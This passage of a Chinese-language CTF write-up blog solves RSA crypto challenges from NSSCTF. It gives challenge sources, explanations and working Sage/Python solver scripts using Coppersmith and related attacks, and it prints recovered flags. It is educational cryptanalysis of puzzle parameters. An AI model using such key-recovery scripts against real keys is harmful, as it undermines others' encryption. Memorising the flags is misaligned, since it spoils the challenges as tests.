class="hljs-number">90361246179367799606636863352077187566064794796456461177972505143929614628873639223638940051613378291778175724735519020067052934403115774679961661481160141872257338930620863078688082915958381094674423803586734810828570206667419458295735288184697613296663226516640069281835035704453280781694226293902395215269</span>]<br>e2,N2 = [<span class="hljs-number">5</span>,<span class="hljs-number">83202136479583179143205059354864808364257451670037867814548678142629716115373207061455185843132942837300718212806534861585785041547496145915392175827479376792813058845422044909477892978293495048968520853100992244672416436363272286740068846609018921112995562647093952700070707124842514243806528982910520604851</span>]<br>e3,N3 = [<span class="hljs-number">3</span>,<span class="hljs-number">146694460234280339612721415368435987068740712812770728817136582256341063038147863645902264969297892447333024201649306207442798919845916187823646745721109151386096190207317810424580842120750075213595282979568495342617919336417068886973047979116994072272482630372638964064972815256237040541007947708358680368391</span>]<br>e4,N4 = [<span class="hljs-number">7</span>,<span class="hljs-number">145212137982314671207105886550619275956842416412937060552686822638155412950680057688522218990023473104787006548449644240065948769143660097622695125682017688804838701293738298008178105057147539522368965730223561911750657089352591376219016726977232279206451303896573325330139830440927228125810665303608828462177</span>]<br>e5,N5 = [<span class="hljs-number">5</span>,<span class="hljs-number">69335368232766044823545542187513771534967902179150417021053554241638095909666122935053210964003511014870892979205875153115719406287728162111662254890513324436473313860142126335197489227724691042286796058111753972895113145188906829975189506125997319609609974126645475084944238417929532560409919420929255247813</span>]<br>e6,N6 = [<span class="hljs-number">5</span>,<span class="hljs-number">93889543065608951579836429313520485233295158467296710329997599807630401722519056218864031741675898621375735347229494633577571323057785261271373295860331130588582231771193563731092603614818963592931492474988532068227153492022582339704874613690044001529412669510094771064646843676765163737757104643318364446839</span>]<br>e7,N7 = [<span class="hljs-number">7</span>,<span class="hljs-number">66174700839404221060785862467924299511645570336361033287335855493589093141782896451863402373425798838446538369142584932156150350565382116869446083154097803842190010954019565857767923584979615770650706675094209251111816761431713779074557571353022624477001770694207393369796369620048999514683357963227119554487</span>]<br>e8,N8 = [<span class="hljs-number">3</span>,<span class="hljs-number">65031485534704406281490718325237831433086480239135617407356760819741796565231283220528137697949585150709734732370203390254643835828984376427852793969716489016520923272675090536677771074867975287284694860155903327351119710765174437247599498342292671117884858621418276613385329637307269711179183430246951756029</span>]<br>e9,N9 = [<span class="hljs-number">5</span>,<span class="hljs-number">72454311940971803130612024751128556938725737742029062979349607787083978826668706819793864356790325653817555839762732164812521831864626411495002267399139766907846534945632792910468487287154661692733986224962564621615361536373173705359255153606552352581704159462310354407361311378558150604159961029937052901709</span>]<br>e10,N10 = [<span class="hljs-number">3</span>,<span class="hljs-number">126172075578367446151297289668746433680600889845504078949758568698284471307000358407453139846282095477016675769468273204536898117467559575203458221600341760844973676129445394999861380625435418853474246813202182316736885441120197888145039130477114127079444939102267586634051045795627433724810346460217871661901</span>]<br>e11,N11 = [<span class="hljs-number">3</span>,<span class="hljs-number">75691424835079457343374072990750986689075078863640186724151061449621926239051140991748483370587430224317778303489124525034113533087612981452189061743589227565099659070008017454957304620495920813121234552401715857719372861565651204968408267740732475458128601061676264465241188491988485848198323410127587280471</span>]<br>e12,N12 = [<span class="hljs-number">7</span>,<span class="hljs-number">88063052818271125442049408332053226451497067720511502513828848476569985821115735898897947439175727789641390104005400308936768495751619165683456550165811034670341697022370415202614387373196086237042577737857259724530596416810462125219296930758592032765843338961894697491961439584875235274163072466474940670589</span>]<br>e13,N13 = [<span class="hljs-number">5</span>,<span class="hljs-number">86478932133708863968749977073639049451666195461247968321317885106346907736572028122496476049748246757185316498949163898915427948597498506162230927380667345132742891001640364064647368394822175742973968167028656790729030556005407153405955458636780270673780720333871959638216946584461925553782697695137132507853</span>]<br>e14,N14 = [<span class="hljs-number">7</span>,<span class="hljs-number">137641493263428303662262187582231235637921833879366309318941383348412296182252654397496377642861646991438721153462001357875169325595544056465299787575422581289053630686684843044593163904089201855371863459503176022957832807726507152235818181000484878683030989944063049622694810207054366378176225221479695833371</span>]<br><br>e = []<br>n = []<br>c = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    e.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;e%d&#x27;</span> % (i+<span class="hljs-number">1</span>)))<br>    n.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;N%d&#x27;</span> % (i+<span class="hljs-number">1</span>)))<br>    c.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;Invitation%d&#x27;</span> % (i+<span class="hljs-number">1</span>)))<br>flag=<span class="hljs-string">b&#x27;GWTH&#123;&#x27;</span>+<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">49</span><br>flag=bytes_to_long(flag)<br>bits=flag.bit_length()<br>b = [(i+<span class="hljs-number">1</span>)*(<span class="hljs-number">3</span>**bits) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br>a = [<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br>m = smupe(c, n, a, b, e_list=e)<br><span class="hljs-built_in">print</span>(long_to_bytes(iroot(<span class="hljs-built_in">int</span>(m), <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]))<br><br><span class="hljs-comment">#b&#x27;GWHT&#123;e959e3f8e7242954b43e1b91de9886e1&#125;Welc0metomyp4rty&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;e959e3f8e7242954b43e1b91de9886e1&#125;</span><br></code></pre></td></tr></table></figure><h1 id="鹤城杯-2021babyrsa"><a class="markdownIt-Anchor" href="#鹤城杯-2021babyrsa"></a> [鹤城杯 2021]BabyRSA</h1><h2 id="题目-20"><a class="markdownIt-Anchor" href="#题目-20"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br>hint1 = p &gt;&gt; <span class="hljs-number">724</span><br>hint2 = q % (<span class="hljs-number">2</span> ** <span class="hljs-number">265</span>)<br>ct = <span class="hljs-built_in">pow</span>(bytes_to_long(flag), e, n)<br><span class="hljs-built_in">print</span>(hint1)<br><span class="hljs-built_in">print</span>(hint2)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(ct)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br><span class="hljs-string">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br><span class="hljs-string">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br><span class="hljs-string">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="分析-20"><a class="markdownIt-Anchor" href="#分析-20"></a> 分析</h2><p>先放一篇文章，讲得比较好</p><blockquote><p><a href="https://blog.csdn.net/qq_51999772/article/details/123620932">RSA中coppersmith定理的应用条件_sagemath coppersmith-CSDN博客</a></p></blockquote><p>我们知道p的高300位，和q的低265位</p><p>经过计算</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo>∗</mo><mi>q</mi><mo>=</mo><mi>n</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>p</mi><mi>l</mi></msub><mo>∗</mo><msub><mi>q</mi><mi>l</mi></msub><mo>=</mo><mi>n</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>p</mi><mi>l</mi></msub><mo>=</mo><mi>n</mi><mo>∗</mo><msubsup><mi>q</mi><mi>l</mi><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p*q=n\quad mod(2^{265})\\p_l*q_l=n\quad mod(2^{265})\\p_l=n*q_l^{-1}\quad mod(2^{265})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1555469999999999em;vertical-align:-0.2914389999999999em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.408561em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2914389999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>我们也可以知道p的低265位，这样我们就知道p的565位，还有459位未知，无法直接用coppersmith求解，只有454未知时我们才可以求解（具体原理可以看上面那篇文章），所以还有5位未知，我们可以爆破一下</p><h2 id="exp-20"><a class="markdownIt-Anchor" href="#exp-20"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>hint1=<span class="hljs-number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br>hint2=<span class="hljs-number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br>n=<span class="hljs-number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br>c=<span class="hljs-number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br>e=<span class="hljs-number">65537</span><br><br>pl = n*invert(hint2, <span class="hljs-number">2</span>**<span class="hljs-number">265</span>) % <span class="hljs-number">2</span>**<span class="hljs-number">265</span><br>pbar = (hint1 &lt;&lt; <span class="hljs-number">724</span>) + pl<br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">5</span>):<br>    f = pbar + (x*<span class="hljs-number">2</span>**<span class="hljs-number">265</span>*<span class="hljs-number">2</span>**<span class="hljs-number">5</span>) + (i&lt;&lt;<span class="hljs-number">265</span>)<br>    f = f.monic()<br>    pp = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">454</span>, beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> pp: <br>        <span class="hljs-keyword">break</span><br><br>p = <span class="hljs-built_in">int</span>(pbar + (pp[<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>**<span class="hljs-number">265</span>*<span class="hljs-number">2</span>**<span class="hljs-number">5</span>) + (i&lt;&lt;<span class="hljs-number">265</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c, invert(e,p-<span class="hljs-number">1</span>), p))))<br><span class="hljs-comment">#b&#x27;flag&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;</span><br></code></pre></td></tr></table></figure><h1 id="gwctf-2019babyrsa2"><a class="markdownIt-Anchor" href="#gwctf-2019babyrsa2"></a> [GWCTF 2019]BabyRSA2</h1><h2 id="题目-21"><a class="markdownIt-Anchor" href="#题目-21"></a> 题目</h2><p>没有题目，nc</p><h2 id="分析-21"><a class="markdownIt-Anchor" href="#分析-21"></a> 分析</h2><p>又是一个写到疯的题目</p><p>而且不能手动输入，只能借助pwntools来传输，所以被迫要去搞了一下wsl的sage环境，这样就方便许多了，下面放几篇教程。</p><p>wsl的安装：</p><p>(搞到最后一步直接用Microsoft Store安装Ubuntu)</p><p><a href="https://blog.csdn.net/weixin_42029733/article/details/137734595">【WSL】在WIN11安装并使用Linux子系统（Ubuntu）_wsl ubuntu-CSDN博客</a></p><p>sagemath环境：</p><p><a href="https://hasegawaazusa.github.io/sagemath-get-started.html#wslsagemath%E6%8E%A8%E8%8D%90">sagemath 入门笔记 | 独奏の小屋 (hasegawaazusa.github.io)</a></p><p>搞完之后你应该能够在vscode里连接上ubuntu了，并且可以执行sage代码</p><p>可以先尝试输入sage，进入sage终端，然后pip安装好pwntools和Crypto（这个我是直接从本地复制过去了）</p><p><a href="https://blog.csdn.net/xiaojin21cen/article/details/109642940">python3报错：ModuleNotFoundError: No module named ‘Crypto‘_modulenotfounderror: no module named 'cryptography-CSDN博客</a></p><p>之后运行的脚本直接在终端中输入 sage [filename].sage</p><p>搞完上面之后就可以开始，建议直接照着exp学，反正我好多原理都没搞懂</p><p>除了最后一个，其他的m都不用转成字节</p><h3 id="第一部分-3"><a class="markdownIt-Anchor" href="#第一部分-3"></a> 第一部分</h3><p>需要爆破一下hash，一共需要爆破5个字符，我是看wp里才看到字符范围是数字和小写字母，我一开始还以为题目给的+last是十六进制，原理就是字符</p><h3 id="第二部分-3"><a class="markdownIt-Anchor" href="#第二部分-3"></a> 第二部分</h3><p>最简单的共模攻击</p><h3 id="第三部分-3"><a class="markdownIt-Anchor" href="#第三部分-3"></a> 第三部分</h3><p>小e，直接开根</p><h3 id="第四部分"><a class="markdownIt-Anchor" href="#第四部分"></a> 第四部分</h3><p>p高位攻击，直接上模板了</p><h3 id="第五部分"><a class="markdownIt-Anchor" href="#第五部分"></a> 第五部分</h3><p>（最后两部分我直接上xenny师傅的exp了，已经写疯了，不想看了）</p><p>共享素数，但是逆元不存在，可以求的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mo stretchy="false">)</mo></msub><mo>=</mo><mn>14</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd(e_i,\phi(n_)=14)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3551999999999999em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mclose mtight">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mclose">)</span></span></span></span></p><p>我们可以求出m<sup>14</sup>但这个直接无法开根</p><p>之后我们发现<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(7,q_1q_2)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>这样我们就可以求出m<sup>2</sup></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>d</mi><mn>3</mn></msub><mo>∗</mo><mn>7</mn><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>q</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>m</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mn>14</mn><mo>∗</mo><msub><mi>d</mi><mn>3</mn></msub></mrow></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_3*7=1\quad mod((q_1-1)(q_2-1))\\m_2=m^{14*d_3}\quad mod(q_1q_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span 